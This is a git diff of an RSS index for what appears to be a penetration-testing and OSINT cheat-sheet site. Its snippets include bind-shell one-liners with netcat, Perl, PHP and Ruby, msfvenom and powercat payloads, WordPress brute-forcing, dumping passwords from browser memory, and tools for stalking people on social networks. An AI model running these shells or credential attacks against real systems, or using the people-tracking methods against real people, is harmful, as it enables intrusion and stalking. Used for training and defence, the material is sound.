@@ -46,8 +46,7 @@ Symbolic link attack # base program int main(void) { system(&amp;#34;ls /path/to
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/technical-recon/domain_ip/</guid>
-      <description>Identification Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com # Get IP address associated to a domain nslookup domain.fr ping domain.fr # Bing dorks to identify host sharing ip:xxx.xxx.xxx.xxx # Reverse DNS Resolution (also usefull for subdomains) for x in {1..255}; do host xx.xx.xx.$x; done 
-Online Passive Identification Tools # You can identify IP block owned by a company ipv4info.com # Then you can find domains and subdomains associated to an IP by using Passive Reverse DNS https://www.</description>
+      <description>Identification Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com # Get IP address associated to a domain nslookup domain.fr ping domain.fr # Bing dorks to identify host sharing ip:xxx.xxx.xxx.xxx # Reverse DNS Resolution (also usefull for subdomains) for x in {1..255}; do host xx.xx.xx.$x; done # Knockknock is a small automated script allowing you to find domaine names # For a registrant (person or company) python3 k2.</description>
     </item>
     
     <item>
@@ -95,8 +94,7 @@ If the site is offline, you can just press toolbar button and request cached ver
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/hosting-and-repositories/github/</guid>
-      <description>Finding user e-mail # Method 1 # Go for it → https://api.github.com/users/xxxxxxx/events/public # And search for “email” ------------------------ # Method 2 # Go for user repositories # Find one repo and go checks commits # Take one commit https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2 # Add .patch at the end and check for email https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2.patch 
-Gitrob # Gitrob is a github scanner and crawler # Can be used to retrieve sensitive data in github repositories https://michenriksen.</description>
+      <description>Finding user e-mail # Method 1 # Go for it → https://api.github.com/users/xxxxxxx/events/public # And search for “email” ------------------------ # Method 2 # Go for user repositories # Find one repo and go checks commits # Take one commit https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2 # Add .patch at the end and check for email https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2.patch# Usually, credential leaks do not occur on the company public Github # But more on developer/employees personal Github</description>
     </item>
     
     <item>
@@ -134,7 +132,7 @@ ScrapedIn # Tool created to assist in performing recon using the LinkedIn API. #
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/local-and-physical/local_recon_enumeration/</guid>
-      <description>Basics whoami ipconfig type “C:\Documents and Settings\Administrator\Desktop\proof.txt” echo %username% echo %path% ipconfig /all netstat -ano # Display hidden files dir /a # Recursive dir dir /s # Available ? Ok drop jaws enum tool ! powershell “$var=1” # Possible ? Ok drop windowsprivcheck.py &amp;#34;C:\Python2X\python.exe&amp;#34; -c &amp;#34;print &amp;#39;1&amp;#39;&amp;#34; # If x86 ? Drop windows-privesc-check.exe # You can use WinPrivCheck.bat to check common misconfigurations and KB https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat # If you can&amp;#39;t browse a folder because of space char # You can use an old trick cmd&amp;gt; cd progra~1</description>
+      <description>Basics whoami whoami /priv ipconfig type “C:\Documents and Settings\Administrator\Desktop\proof.txt” # Powershell whoami $env:UserName echo %username% echo %path% ipconfig /all netstat -ano # Display hidden files dir /a # Recursive dir dir /s # Available ? Ok drop jaws enum tool ! powershell “$var=1” # Possible ? Ok drop windowsprivcheck.py &amp;#34;C:\Python2X\python.exe&amp;#34; -c &amp;#34;print &amp;#39;1&amp;#39;&amp;#34; # If x86 ? Drop windows-privesc-check.exe # You can use WinPrivCheck.bat to check common misconfigurations and KB https://github.</description>
     </item>
     
     <item>
@@ -161,7 +159,8 @@ ScrapedIn # Tool created to assist in performing recon using the LinkedIn API. #
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/shells-methods/methodology/</guid>
-      <description>GOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh  
+      <description>https://dolosgroup.io/blog/remote-access-cheat-sheet
+GOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh  
 Methodology _ Keep it simple, test for very basic things. | | |________ Which languages are interpreted by the servers, try to upload some simple echo | | | | | |____ Found php ?</description>
     </item>
     
@@ -290,7 +289,7 @@ Monitoring, Recon and Dumping # Using the aircrack-ng suite # Turning on the mon
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/content-management-system-cms/wordpress/</guid>
-      <description>General &amp;amp; Tricks # Username can be guessed on WordPress since the username will generate a different error message if it doesn&amp;#39;t exist. # Interesting files https://monsite.com/robots.txt https://monsite.com/feed https://monsite.com/readme.html https://monsite.com/xmlrpc.php # Configuration files https://monsite.com/.htaccess https://monsite.com/wp-config.php # Directory listing https://monsite.com/wp-includes # XML-RPC attack (https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit) # You can bruteforce users ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1 # If by any way you can upload files, go check /upload or /uploads for your files</description>
+      <description>General &amp;amp; Tricks # Username can be guessed on WordPress since the username will generate a different error message if it doesn&amp;#39;t exist. # Interesting files https://monsite.com/robots.txt https://monsite.com/feed https://monsite.com/readme.html https://monsite.com/xmlrpc.php # Configuration files https://monsite.com/.htaccess https://monsite.com/wp-config.php # Directory listing https://monsite.com/wp-includes # XML-RPC attack (https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit) # You can bruteforce users ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1 # If by any way you can upload files, go check /upload or /uploads for your files # Get WPEngine&amp;#39;s config file /_wpeprivate/config.</description>
     </item>
     
     <item>
@@ -392,8 +391,18 @@ Droopescan # Not Drupal specific but can work too (Wordpress, SilverStripe, Joom
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/email/</guid>
-      <description>Online tools # Domain e-mail syntax finder https://www.email-format.com https://hunter.io # E-mail validator https://tools.verifyemailaddress.io/ http://mailtester.com https://dnslytics.com/email-test https://verify-email.org/ 
+      <description>Online tools # Domain e-mail syntax finder https://www.email-format.com https://hunter.io # E-mail validator https://tools.verifyemailaddress.io/ http://mailtester.com https://dnslytics.com/email-test https://verify-email.org/ https://verifalia.com/validate-email 
 The Harvester # theHarvester is a famous OSINT and scrapping tool for passiv recon on targets # Using API keys will highly increase results Usage: theharvester options -d: Domain to search or company name -b: data source: baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all -s: start in result number X (default: 0) -v: verify host name via dns resolution and search for virtual hosts -f: save the results into an HTML and XML file (both) -n: perform a DNS reverse query on all ranges discovered -c: perform a DNS brute force for the domain name -t: perform a DNS TLD expansion discovery -e: use this DNS server -p: port scan the detected hosts and check for Takeovers (80,443,22,21,8080) -l: limit the number of results to work with(bing goes from 50 to 50 results, google 100 to 100, and pgp doesn\&amp;#39;t use this option) -h: use SHODAN database to query discovered hosts Examples: theharvester -d microsoft.</description>
+    </item>
+    
+    <item>
+      <title>FREEIPA</title>
+      <link>/other-systems/freeipa/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/other-systems/freeipa/</guid>
+      <description>What is FreeIPA ? https://posts.specterops.io/attacking-freeipa-part-i-authentication-77e73d837d6a https://posts.specterops.io/attacking-freeipa-part-ii-enumeration-ad27224371e1# Open source alternative to Microsoft Windows Active Directory # Primarily used as an integrated management solution for Unix environments. # Similar to Active Directory, FreeIPA implements a full LDAP directory infrastructure # So all together we have a Unix host management system # Complete with LDAP and Kerberos that allows for multi-factor authentication. 
+Informations Files # Kerberos informations to get enrolled (location of KDCs.</description>
     </item>
     
     <item>
@@ -457,12 +466,18 @@ DNS Zone Transfer # Zone transfer using dig dig @challenge01.root-me.org -p 5401
     </item>
     
     <item>
-      <title>MISC</title>
-      <link>/other-systems/misc/</link>
+      <title>Methodology</title>
+      <link>/open-source-intelligence-osint/general/methodology/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/other-systems/misc/</guid>
-      <description> RTSP and VLC # RTSP (Real Time Streaming Protocol) is used with IP camera # You can view it from VLC Media Player # Open Network Stream &amp;gt; rtsp://ip/endpoint</description>
+      <guid>/open-source-intelligence-osint/general/methodology/</guid>
+      <description>Sources : https://www.dfir.training/osint
+Workflow Domain 
+E-mail 
+Username 
+Real Name 
+Phone 
+Location</description>
     </item>
     
     <item>
@@ -546,7 +561,7 @@ Golden Ticket # Golden Ticket &amp;gt; Nom du compte administrateur (Administrat
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/technical-recon/subdomain_enumeration/</guid>
-      <description>Google Dorks &amp;amp; Bing Dorks # Google dorks are usefull for finding new subdomains site:wikipedia.org site:*.wikipedia.org -www -store -jobs -uk # Bing also support dorks and can give others results site: # When you use the Google Dork: site:*.example.com, NEVER forget to check site:*.*.example.com site:*.*.*.example.com  
+      <description>Google Dorks &amp;amp; Bing Dorks # Google dorks are usefull for finding new subdomains site:wikipedia.org site:*.wikipedia.org -www -store -jobs -uk # Bing also support dorks and can give others results site: # When you use the Google Dork: site:*.example.com, NEVER forget to check site:*.*.example.com site:*.*.*.example.com # Github dorks also allow to find many subdomains &amp;#34;teslamotors.com&amp;#34; password # ... 
 Online DNS tools and services # VirusTotal runs its own passive DNS replication service # DNS Dumpster can also find large number of sub-domains</description>
     </item>
     
@@ -556,7 +571,7 @@ Online DNS tools and services # VirusTotal runs its own passive DNS replication 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/social-networks/twitter/</guid>
-      <description>Tips &amp;amp; Tricks # With spoonbill, you can check and record people accounts modification # It checks accounts of people you&amp;#39;re following https://tweepsect.com/ # When was created an account http://twbirthday.com/***REMOVED***/ # Find stalker (checks who&amp;#39;s following and who&amp;#39;s followed) and intersect them https://tweepsect.com/ # You can triangulate accounts by looking who&amp;#39;s following x+x or who y+y follows http://twiangulate.com # Search using geocode geocode:36.1143855,-115.1727518,1km # Tweeter account analysis (account needed) https://tweetreach.</description>
+      <description>Tips &amp;amp; Tricks # With spoonbill, you can check and record people accounts modification # It checks accounts of people you&amp;#39;re following https://tweepsect.com/ # When was created an account http://twbirthday.com/***REMOVED***/ # Find stalker (checks who&amp;#39;s following and who&amp;#39;s followed) and intersect them https://tweepsect.com/ # You can triangulate accounts by looking who&amp;#39;s following x+x or who y+y follows http://twiangulate.com https://doesfollow.com/ # Search using geocode geocode:36.1143855,-115.1727518,1km # Tweet geolocation https://onemilliontweetmap.com # Tweeter account analysis (account needed) https://tweetreach.</description>
     </item>
     
     <item>
@@ -624,7 +639,7 @@ Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/social-networks/facebook/</guid>
-      <description>Tips &amp;amp; Tricks # Stalking and Information Gathering https://stalkscan.com/ # Facebook video downloader https://fbdown.net/ # Find Facebook ID https://findmyfbid.com 
+      <description>Tips &amp;amp; Tricks # Stalking and Information Gathering https://stalkscan.com/ # Facebook video downloader https://fbdown.net/ # Find Facebook ID https://findmyfbid.com https://lookup-id.com/ 
 Facebook Tricks # You can search by e-mail # You can find accounts by e-mail with the recover function https://www.facebook.com/login/identify?ctx=recover https://www.facebook.com/login/identify # Search photo by ID https://www.facebook.com/photo.php?fbid=PHOTO-ID-HERE 
 Facebook Sleep Stats # A small tool to show the potential privacy implications modern social media have. # By tracking online/offline status of people on Facebook, it is possible to get an accurate image of their sleep pattern.</description>
     </item>
@@ -677,6 +692,15 @@ ARP Spoofing # Old technique but still usable sometimes # You can spoof ARP traf
       <guid>/cryptography/misc/</guid>
       <description>XOR Encryption https://github.com/hellman/xortool https://github.com/tomchop/unxor 
 GPG Encryption sudo gpg --decrypt /mnt/media/dir2/findme.</description>
+    </item>
+    
+    <item>
+      <title>MISC</title>
+      <link>/other-systems/misc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/other-systems/misc/</guid>
+      <description> RTSP and VLC # RTSP (Real Time Streaming Protocol) is used with IP camera # You can view it from VLC Media Player # Open Network Stream &amp;gt; rtsp://ip/endpoint</description>
     </item>
     
     <item>
@@ -839,7 +863,8 @@ Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/post-exploitation-techniques/searching_informations/</guid>
-      <description>Scavenger # Scavenger is a tool used above CrackMapExec to automate the process # of looking for sensitive files and informations during Internal Pentest python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local $ python3 ./scavenger.py smb --target iplist --username administrator --password Password123 --domain test.local --overwrite 
+      <description>Tips # Getting passwords from browser memory procdump.exe -ma firefox_pid strings.exe firefox.dmp | findstr /i &amp;#34;Passwd=&amp;#34; 
+Scavenger # Scavenger is a tool used above CrackMapExec to automate the process # of looking for sensitive files and informations during Internal Pentest python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local $ python3 ./scavenger.py smb --target iplist --username administrator --password Password123 --domain test.local --overwrite 
 WinSCP # WinSCP is potentially exploitable in the registry if not using a master password # You can manually request the key reg.</description>
     </item>
     
@@ -849,8 +874,8 @@ WinSCP # WinSCP is potentially exploitable in the registry if not using a master
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/searchingsomeone/</guid>
-      <description>Resources # GREAT resources containing different graphs and processes # to investigate based on what you have https://medium.com/@Peter_UXer/osint-how-to-find-information-on-anyone-5029a3c7fd56 
-Searching People # Very good and accurtate tool # You can search by name, reverse phone or reverse address https://www.truepeoplesearch.com/# 118218 for France is very good # Reverse dict https://www.118712.fr/https://i-sight.com/resources/101-osint-resources-for-investigators/ # You can use many online resources to search for people by name, phone number, etc.. RocketReach - Search for many informations about peoples (free plan, 3/month) Ancestry - Search for genealogy Filae - Search for genealogy, family, relationships.</description>
+      <description>Resources # GREAT resources containing different graphs and processes # to investigate based on what you have https://medium.com/@Peter_UXer/osint-how-to-find-information-on-anyone-5029a3c7fd56 https://medium.com/week-in-osint/getting-a-grasp-on-googleids-77a8ab707e43 https://www.aware-online.com/en 
+Searching People # Very good and accurate tool # You can search by name, reverse phone or reverse address https://www.truepeoplesearch.com/ # Good search engine, different kinds of data https://webmii.com/ # Kinda amazing resource # Finding company related data about a person https://aleph.occrp.org# 118218 for France is very good # Reverse dict https://www.</description>
     </item>
     
     <item>
@@ -945,11 +970,10 @@ Out of Band XXE (OOB XXE) # The exploitation will download a remote DTD file # A
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/shells-methods/bind/</guid>
-      <description> Listener # Linux nc -nlvp 51337 -e /bin/bash # OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&amp;gt;&amp;amp;1|nc -lvp 51337 &amp;gt;/tmp/f 
-Windows msfvenom -p windows/shell_bind_tcp -b “\x00\x0a\x0d” LHOST=IP LPORT=1337 -f asp &amp;gt; acknak_TCP_RS.asp 
+      <description>Listener # Linux nc -nlvp 51337 -e /bin/bash # OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&amp;gt;&amp;amp;1|nc -lvp 51337 &amp;gt;/tmp/f 
+Windows msfvenom -p windows/shell_bind_tcp -b “\x00\x0a\x0d” LHOST=IP LPORT=1337 -f asp &amp;gt; acknak_TCP_RS.asphttps://github.com/besimorhino/powercat # Victim (listen) . .\powercat.ps1 powercat -l -p 7002 -ep # Connect from attacker . .\powercat.ps1 powercat -c 127.0.0.1 -p 7002 
 Perl perl -e &amp;#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\ close C){open(STDIN,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);exec(&amp;#34;/bin/bash -i&amp;#34;);};&amp;#39; 
-PHP php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.0.0.0&amp;#34;,51337);\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,&amp;#34;$ &amp;#34;,2))exit;\ $in=socket_read($cl,100);$cmd=popen(&amp;#34;$in&amp;#34;,&amp;#34;r&amp;#34;);while(!feof($cmd)){$m=fgetc($cmd);\ socket_write($cl,$m,strlen($m));}}&amp;#39; 
-Ruby ruby -rsocket -e &amp;#39;f=TCPServer.new(51337);s=f.accept;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,s,s,s)&amp;#39;</description>
+PHP php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.0.0.0&amp;#34;,51337);\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!</description>
     </item>
     
     <item>
@@ -1006,7 +1030,7 @@ Exploiting crontab # If a script is running with higher privileges echo &amp;#34
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/exploitation/kerberos/</guid>
-      <description>https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
+      <description>Cheatsheet : https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a KRB5CONF : https://gist.github.com/kaluche/ba69e701624c2e44e3d1f60c5370cebe
 General &amp;amp; Theory # Kerberos is just SSO, it&amp;#39;s like SAML or OpenID. # Authentication to a trusted source (KDC) # KDC delegates access # KDC = Key Distribution Center # AS = Authentication Service # TGT= Ticket Granting Ticket # TGS = Ticket Graning Service # In network, protocol used is KRB5 # TGS are for resources, not hosts # Authentication Process # - Authenticate to AS with a password → Get a TGT # - Request access to resource from TGS → Show TGT # - Valid TGT → Get TGS # - Show TGS to resource → resource accepts TGS → Log in # Each resource can check for valid TGS → Privileged Attribute Certificate (PAC) → Addition to Kerberos # NTLM Authentication # - chall/response using NT hash # - NTLMSSP # Communication with DC over NetLogon (RPC)</description>
     </item>
     
@@ -1045,7 +1069,7 @@ PoC and enumeration # It is possible to prove the vulnerability by reading local
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/social-networks/tinder/</guid>
-      <description># More like Social Engineering # But it&amp;#39;s possible to fake your location # Using the android app → Android Emulator # Using the web app → Fake your brower location # Then you can go on sources (web app) and get pictures to reverse image search # You can also save them using wireshark # https://www.</description>
+      <description># More like Social Engineering # But it&amp;#39;s possible to fake your location # Using the android app → Android Emulator # Using the web app → Fake your brower location # Then you can go on sources (web app) and get pictures to reverse image search # You can also save them using wireshark # https://www.learnallthethings.net/osmosis # You can browe users https://www.</description>
     </item>
     
     <item>
@@ -1108,15 +1132,6 @@ NanoCMS # Password and sensitive data leak [url]/data/pagesdata.</description>
     </item>
     
     <item>
-      <title>Public Documents and Metadata</title>
-      <link>/open-source-intelligence-osint/technical-recon/documents_metadata/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/documents_metadata/</guid>
-      <description>Metagoofil # Extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites # The tool first perform a query in Google requesting different filetypes that can have useful metadata (pdf, doc, xls,ppt,etc) # Then will download those documents to the disk and extracts the metadata of the file using specific libraries for # parsing different file types (Hachoir, Pdfminer, etc) # Options # -d: domain to search # -t: filetype to download (pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx) # -l: limit of results to search (default 200) # -h: work with documents in directory (use \&amp;#34;yes\&amp;#34; for local analysis) # -n: limit of files to download # -o: working directory (location to save downloaded files) # -f: output file metagoofil.</description>
-    </item>
-    
-    <item>
       <title>RDP Exploitation</title>
       <link>/windows-systems/exploitation/rdp_exploitation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1132,7 +1147,7 @@ cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\Cur
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/social-networks/snapchat/</guid>
-      <description>Online Research Tools # Online browser # Potentially NSFW https://sovip.</description>
+      <description>Online Research Tools # Online browser # Potentially NSFW https://sovip.io # User Search https://www.snapdex.com/ https://snapyfox.com/ # Location https://map.</description>
     </item>
     
     <item>
@@ -1163,6 +1178,15 @@ Identification and manual test # Using netcat nc -nv IP 119 LIST GROUP group_nam
       <description>/etc/init.d/pure-ftpd 
 SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserver.py SHARE_NAME path/to/share # From target Windows: net view \\KALI_IP (Should display the SHARE_NAME) dir \\KALI_IP\SHARE_NAME copy \\KALI_IP\SHARE_NAME\file.exe . # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user # can be usefull to PTH, or crack passwordsimpacket smbserver net use z: \\attackerip\sharename 
 Build a FTP and transfer file # Set up a ftp downloading script on the target machine: echo open IP 21 &amp;gt; ftp.</description>
+    </item>
+    
+    <item>
+      <title>Geolocation</title>
+      <link>/open-source-intelligence-osint/human-recon/phone_number/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/phone_number/</guid>
+      <description>Getting informations using a phone number # When you have a phone number, you can use some messaging websites/applications # If the target is registered, it can provides additional informations # /!\ Some applications might tell the target you&amp;#39;ve reached them /!\ https://medium.com/@Ginger_T/how-can-we-use-messenger-apps-in-osint-682cbc634f# Facebook Messenger # Profile picture and details from Facebook bio # Facetime # If you add a contact on Apple it wil tell you if the target can use Facetime # If so, you know the target is using an Apple Product # ICQ # Profile Picture, Nickname, Name, BIO &amp;amp; last seen.</description>
     </item>
     
     <item>
@@ -1200,7 +1224,8 @@ Modules &amp;amp; Tools • Censys: uses censys.io to collect a large amount of 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/</guid>
-      <description>Socialscan (https://github.com/iojw/socialscan) # Many tools used to check if an account exists comes with false positive # 100% accuracy: Rather than scanning profile pages, socialscan queries the # registration servers of the platforms directly, retrieving the appropriate # CSRF tokens, headers, and cookies. # This eliminates all false positives/negatives, ensuring that results are accurate. # Speed: socialscan uses asyncio along with aiohttp to conduct all # queries concurrently, resulting in very quick searching even with bulk queries.</description>
+      <description># Username availability https://namechk.com/ 
+Socialscan (https://github.com/iojw/socialscan) # Many tools used to check if an account exists comes with false positive # 100% accuracy: Rather than scanning profile pages, socialscan queries the # registration servers of the platforms directly, retrieving the appropriate # CSRF tokens, headers, and cookies. # This eliminates all false positives/negatives, ensuring that results are accurate. # Speed: socialscan uses asyncio along with aiohttp to conduct all # queries concurrently, resulting in very quick searching even with bulk queries.</description>
     </item>
     
     <item>
@@ -1220,8 +1245,7 @@ Modules &amp;amp; Tools • Censys: uses censys.io to collect a large amount of 
       <guid>/web-attacks/burpsuite/</guid>
       <description>WORK IN PROGRESS 
 Notes / Tips # /!\ HTTP POST Requests needs two carriage return at the end to be valid ! 
-Modules / Addons TODO 
-Resources to check # Complete MOOC style course (subscribing but it&amp;#39;s free) (2 links are the same course) https://www.udemy.com/burp-suite/ https://hackademy.aetherlab.net/p/burp-suite # Video course https://www.tutorialspoint.com/burpsuite/index.asp # Kinda detailed tutorial (text + pictures) https://www.pentestgeek.com/web-applications/burp-suite-tutorial-1 https://www.pentestgeek.com/web-applications/how-to-use-burp-suite # Fast course/tutorial (text + images) https://linuxconfig.org/learn-burp-suite-on-kali-linux-part-2 https://linuxconfig.</description>
+Modules / Addons # Autorize # For Each Request you do, it will send an equal request # But with changed cookies of the session or any additional header used for authorization. # Just add cookies for user B and browse app using user A # Try accessing restricted ressources for user B and check for server responses # 200 --&amp;gt; Possible IDOR# JSON Beautifier # This extension adds a new tab to Burp&amp;#39;s HTTP message viewer to beautify JSON content.</description>
     </item>
     
     <item>
@@ -1245,12 +1269,23 @@ Exploiting the classic Manager # Metasploit provides an easy to use module to up
     </item>
     
     <item>
+      <title>Images</title>
+      <link>/open-source-intelligence-osint/human-recon/images/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/images/</guid>
+      <description>General # Flickr Image search https://www.flickr.com/map 
+Reverse Image Search # General Engines https://images.google.com/ https://tineye.com/ https://www.bing.com/?scope=images&amp;amp;nr=1&amp;amp;FORM=NOFORM # Reverse Russia https://www.yandex.com/images/ # Reverse China http://images.baidu.com/ 
+Image Investigation # EXIF and metadata http://exif.regex.info/exif.cgi # Basics Forensics https://fotoforensics.com/ # Text recognition (OCR) https://www.newocr.com/ # Stolen Camera Finder https://www.</description>
+    </item>
+    
+    <item>
       <title>MISC</title>
       <link>/open-source-intelligence-osint/technical-recon/misc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/technical-recon/misc/</guid>
-      <description>Secrets # Looking for passwors, API keys etc # Check Online IDES site:http://ideone.com “apikey” site:http://ideone.com “aws_access_key_id” Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.</description>
+      <description>Secrets # Looking for passwors, API keys etc # Check Online IDES site:http://ideone.com “apikey” site:http://ideone.com “aws_access_key_id”# Default passwords https://www.routerpasswords.com/ https://cirt.net/passwords https://default-password.info/ http://defaultpassword.us/ http://www.passwordsdatabase.com/ http://open-sez.me/ Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.</description>
     </item>
     
     <item>
@@ -1298,6 +1333,17 @@ User Interface Header # Import --&amp;gt; Used to import collection or environme
       
       <guid>/recon-enumeration/services-enumeration/143_imap/</guid>
       <description> Identification and Scans # Nmap scan nmap -v -sV --version-intensity=5 --script imap-capabilities -p T:143 &amp;lt;IP&amp;gt; # Banner grabbing telnet &amp;lt;IP&amp;gt; 143 # Banner grabbing and test connection nc -nv IP 143 A1 LOGIN “root” “” A1 LOGIN root toor A1 LOGIN root root</description>
+    </item>
+    
+    <item>
+      <title>Amazon Web Services (AWS)</title>
+      <link>/web-attacks/amazon_web_services/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/amazon_web_services/</guid>
+      <description>https://github.com/toniblyx/my-arsenal-of-aws-security-tools https://github.com/RhinoSecurityLabs/ccat https://github.com/RhinoSecurityLabs/pacu https://github.com/carnal0wnage/weirdAAL https://github.com/Static-Flow/CloudCopy GitLeaks (https://github.com/zricethezav/gitleaks) # Audit git repos for secrets keys ./gitleaks --repo=xxxxx --verbose --pretty 
+Enumerate IAM (https://github.com/andresriancho/enumerate-iam) # Enumerate the permissions associated with AWS credential set ./enumerate-iam.py --access-key AKIA... --secret-key StF0q... # enumerate-iam.py tries to brute force all API calls allowed by the IAM policy. # The calls performed by this tool are all non-destructive (only get* and list* calls are performed). 
+SQLmap proxy for AWS https://github.</description>
     </item>
     
     <item>
@@ -1389,6 +1435,16 @@ Credentials bruteforce # Using ncrack for one user ncrack -vv -u nina -P passwor
       
       <guid>/recon-enumeration/services-enumeration/4555_rsip/</guid>
       <description>Forwarding admin&amp;rsquo;s mails # Connection through netcat (can test for creds) nc -nv &amp;lt;IP&amp;gt; 4555 # Get commands HELP # Get users (hopefully an admin?) listusers # Add user adduser haax ***REMOVED*** # Set an alias for our user setalias mailadmin haax # Set mail forwarding setforwarding mailadmin haax@lab.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>/open-source-intelligence-osint/technical-recon/documents_metadata/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/documents_metadata/</guid>
+      <description>sudo +++ title = &amp;ldquo;Public Documents and Metadata&amp;rdquo; weight = &amp;ldquo;60&amp;rdquo; +++
